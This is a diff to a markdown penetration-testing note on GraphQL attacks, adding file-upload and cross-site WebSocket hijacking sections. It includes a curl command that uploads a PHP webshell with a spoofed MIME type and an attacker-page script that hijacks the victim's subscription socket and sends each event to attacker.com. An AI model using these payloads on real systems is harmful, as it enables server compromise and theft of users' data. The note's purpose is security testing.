@@ -1,6 +1,6 @@
 # GraphQL Attacks
 
-#GraphQL #APIAttacks #Injection #WebAppAttacks #Introspection #BOLA #DoS #graphw00f #clairvoyance #graphqlmap #BurpSuite
+#GraphQL #APIAttacks #Injection #WebAppAttacks #Introspection #BOLA #FileUpload #CSWSH #DoS #graphw00f #clairvoyance #graphqlmap #BurpSuite
 
 ## What is this?
 
@@ -195,6 +195,31 @@ curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d
 
 ---
 
+## File Upload via GraphQL (multipart spec)
+
+Many GraphQL servers (Apollo + `graphql-upload`, Yoga, Absinthe, gqlgen…) implement the **GraphQL multipart request spec** to accept files through an `Upload` scalar. It's a distinct attack surface the JSON body never shows — a `mutation(... $file: Upload!)` in the schema is the tell. The request is `multipart/form-data` with three parts:
+
+- **`operations`** — the GraphQL operation JSON, with the file variable set to `null`
+- **`map`** — maps each file part to a variable path
+- **`0`, `1`, …** — the actual file bytes
+
+```bash
+# Schema tell (from introspection): a mutation arg typed Upload / Upload!
+#   mutation($file: Upload!) { uploadFile(file: $file) { url filename } }
+
+# Upload a webshell — the whole point is the resolver writes it somewhere reachable
+curl -s -X POST "http://<target>/graphql" \
+  -F operations='{"query":"mutation($file: Upload!){ uploadFile(file: $file){ url filename } }","variables":{"file":null}}' \
+  -F map='{"0":["variables.file"]}' \
+  -F 0=@shell.php\;type=image/png
+# → note the ;type= to spoof MIME past a content-type check; combine with a
+#   double-extension / magic-byte polyglot exactly as in [[File Upload Attacks]].
+```
+
+> [!tip] **Where GraphQL upload bugs actually bite:** the resolver, not the transport. Test the same weaknesses as a normal upload — unrestricted extension → webshell, **path traversal in the filename** (`-F operations='...{"file":null}...'` with a filename of `../../../var/www/html/shell.php`), and **overwrite** of an existing file. Two GraphQL-specific twists: (1) the `map` can point one uploaded part at **multiple** variable paths (`{"0":["variables.a","variables.b"]}`) — fan-out that some size/count limits miss; (2) if the server fetches from a URL instead of a part (`uploadFromUrl(url:)`), it's [SSRF](#ssrf-via-graphql), not upload. Full upload-bypass matrix: [[File Upload Attacks]].
+
+---
+
 ## Authorization Bypass
 
 ```bash
@@ -236,6 +261,29 @@ curl -s "http://<target>/graphql?query=mutation%7BupdateEmail(email%3A%22attacke
 ```
 
 > [!note] Mitigation is to reject non-`application/json` content types and disable GET for mutations — so testing which content types the endpoint tolerates is the first CSRF check.
+
+---
+
+## Cross-Site WebSocket Hijacking (Subscriptions)
+
+Subscriptions run over a WebSocket, and the DoS section above only exhausts them — but a WS handshake is **not** protected by CORS or the JSON-preflight that guards the HTTP endpoint. If the subscription socket authenticates from the **victim's cookies** and the server doesn't validate `Origin`, an attacker page can open the socket *as the victim* and receive their live data cross-origin (**CSWSH**) — the WebSocket cousin of the [CSRF](#csrf-via-graphql) case above.
+
+```html
+<!-- Attacker page: victim's cookies ride the WS handshake automatically -->
+<script>
+const ws = new WebSocket("wss://<target>/graphql", "graphql-transport-ws");  // or "graphql-ws" (legacy)
+ws.onopen = () => {
+  ws.send(JSON.stringify({type:"connection_init", payload:{}}));            // cookie auth = empty payload
+  ws.send(JSON.stringify({id:"1", type:"subscribe",                          // legacy: type:"start"
+    payload:{query:"subscription { messages { id body sender } }"}}));
+};
+ws.onmessage = e => fetch("https://attacker.com/x?d=" + btoa(e.data));       // exfil each pushed event
+</script>
+```
+
+> [!warning] **The precondition is cookie-based WS auth.** Many GraphQL WS servers instead expect a token *inside* `connection_init`'s `payload` (`{"Authorization":"Bearer …"}`) — the browser won't supply that cross-site, so CSWSH fails and the socket is safe. CSWSH only lands when the handshake trusts ambient cookies **and** `Origin` is unchecked. Test both: replay the handshake from a foreign `Origin` header and see if `connection_ack` still comes back.
+
+> [!tip] Same missing `Origin` check also enables **cross-site mutation over WS** — subscribe is just the read path; a `subscribe` with a mutation-bearing operation (or a server that routes queries over the socket) lets the attacker page act as the victim, not just watch.
 
 ---
 
@@ -425,5 +473,5 @@ curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" \
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-07-31*
+*Updated: 2026-09-18*
 *Model: claude-opus-4-8*
